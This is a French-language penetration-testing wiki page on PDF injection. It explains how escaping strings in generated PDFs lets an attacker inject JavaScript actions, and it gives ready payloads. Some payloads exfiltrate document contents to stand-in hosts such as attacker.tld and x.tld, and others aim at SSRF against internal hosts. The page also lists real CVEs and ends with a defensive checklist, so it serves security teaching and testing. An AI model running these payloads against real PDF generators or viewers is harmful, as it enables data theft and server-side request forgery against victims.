# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Si votre entrée est reflétée dans un fichier PDF, vous pouvez essayer d'injecter des données PDF pour exécuter du JavaScript, effectuer du SSRF ou voler le contenu du PDF.**
La syntaxe PDF est extrêmement permissive : si vous pouvez sortir de la chaîne ou du dictionnaire qui incorpore votre entrée, vous pouvez ajouter de nouveaux objets (ou de nouvelles clés dans le même objet) que Acrobat/Chrome parseront sans problème.
Depuis 2024, une vague de rapports bug-bounty a montré qu'*une parenthèse ou un backslash non échappé suffit* pour une exécution complète de script.

## TL;DR – Modern Attack Workflow (2024-2026)
1. Trouvez toute valeur contrôlée par l'utilisateur qui finit à l'intérieur d'un **(parenthesis string)**, `/URI ( … )` ou `/JS ( … )` field in the generated PDF.
2. Injectez `) ` (fermant la chaîne) suivi d'un des primitives ci-dessous et terminez par une parenthèse ouvrante pour conserver la validité de la syntaxe.
3. Livrez le PDF malveillant à une victime (ou à un service backend qui rend automatiquement le fichier – idéal pour des bugs aveugles).
4. Votre payload s'exécute dans le visualiseur PDF :
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Le premier `)` ferme la chaîne URI d'origine, puis nous ajoutons un nouveau dictionnaire **Action** que Acrobat exécutera lorsque l'utilisateur cliquera sur le lien.*

## Primitives d'injection utiles
| Objectif | Payload Snippet | Notes |
|------|-----------------|-------|
| **JavaScript à l'ouverture** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | S'exécute instantanément à l'ouverture du document (fonctionne dans Acrobat, pas dans Chrome). |
| **JavaScript sur le lien** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Fonctionne dans PDFium & Acrobat si vous contrôlez une annotation `/Link`. |
| **Exfiltration de données aveugle** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combinez avec `this.getPageNthWord` dans le JS pour voler du contenu. |
| **SSRF côté serveur** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Même chose que ci‑dessus mais ciblez une URL interne — utile lorsque le PDF est rendu par des services back-office qui respectent `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Attachez au dictionnaire Page/Annotation/Form pour exécuter à l'ouverture/au focus. |
| **Saut de ligne pour nouveaux objets** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Si la bibliothèque vous permet d'injecter des retours à la ligne, vous pouvez créer des objets entièrement nouveaux. |

## Actions embarquées comme cibles d'injection
Les visualiseurs PDF considèrent les **actions embarquées** telles que `/OpenAction` et `/AA` (Additional Actions) comme des fonctionnalités de premier plan qui peuvent s'exécuter à l'ouverture d'un document ou lors du déclenchement d'un événement spécifique. Si vous pouvez injecter dans n'importe quel dictionnaire acceptant des actions (Catalog, Page, Annotation, or Form field), vous pouvez greffer un `/AA` tree et déclencher du JavaScript à l'ouverture/au focus.

Exemple de payload pour **generator-side object injection** (fermez la chaîne/dictionnaire original et injectez `/AA`) :
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Ce schéma correspond à des problèmes récents de jsPDF où une entrée contrôlée par l'attaquant, passée à `addJS` (ou à certains champs AcroForm), sort de la chaîne JavaScript prévue et injecte un dictionnaire **Additional Action**.

## Astuce d'énumération aveugle
Gareth Heyes (PortSwigger) a publié un one-liner qui énumère tous les objets d'un document inconnu — pratique lorsque vous ne pouvez pas voir le PDF généré :
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Le code itère sur le DOM d'Acrobat et effectue des requêtes sortantes pour chaque paire propriété/valeur, vous fournissant un *JSON-ish* dump du fichier.
Consultez le white-paper “Portable Data **ex**Filtration” pour la technique complète.

## Bugs réels (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` injection d'objet PDF : des chaînes contrôlées par l'attaquant peuvent fermer le littéral JS et injecter des actions `/AA` → `/O` → `/JavaScript` qui se déclenchent à l'ouverture/au focus.
* **CVE-2024-4367** – Exécution arbitraire de JavaScript dans PDF.js de Firefox avant la 4.2.67, contournant le sandbox avec une action `/JavaScript` spécialement conçue.
* **Bug bounty 2024-05** – Une grande fintech a autorisé des notes de facture fournies par le client qui finissaient dans `/URI` ; rapport payé $10k après démonstration d'un SSRF vers un hôte de métadonnées interne en utilisant l'URI `file:///`.
* **CVE-2023-26155** – `node-qpdf` command-injection via un chemin PDF non assaini montre l'importance d'échapper les backslashes et les parenthèses même *avant* la couche PDF.

## Fiche défensive
1. **Ne concaténez jamais des entrées utilisateur brutes** à l'intérieur de chaînes ou noms `(`…`)`. Échappez `\`, `(`, `)` comme l'exige §7.3 de la spec PDF ou utilisez des hex strings `<...>`.
2. Si vous générez des liens, préférez `/URI (https://…)` que vous encodez *complètement* en URL ; bloquez les schémas `javascript:` dans les viewers clients.
3. Supprimez ou validez les dictionnaires `/OpenAction`, `/AA` (actions supplémentaires), `/Launch`, `/SubmitForm` et `/ImportData` lors du post-traitement des PDFs.
4. Sur le serveur, convertissez les PDFs non fiables à l'aide d'un *headless converter* (p.ex. qpdf –decrypt –linearize) qui supprime JavaScript et les actions externes.
5. Maintenez les viewers PDF à jour ; PDF.js < 4.2.67 et Acrobat Reader avant les correctifs de juillet 2024 permettent une exécution de code triviale.
6. Si vous utilisez des générateurs côté client (p.ex. jsPDF), ne passez jamais d'entrées non fiables à `addJS` ou aux setters AcroForm qui se retrouvent dans des dictionnaires d'actions PDF.

## Références
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
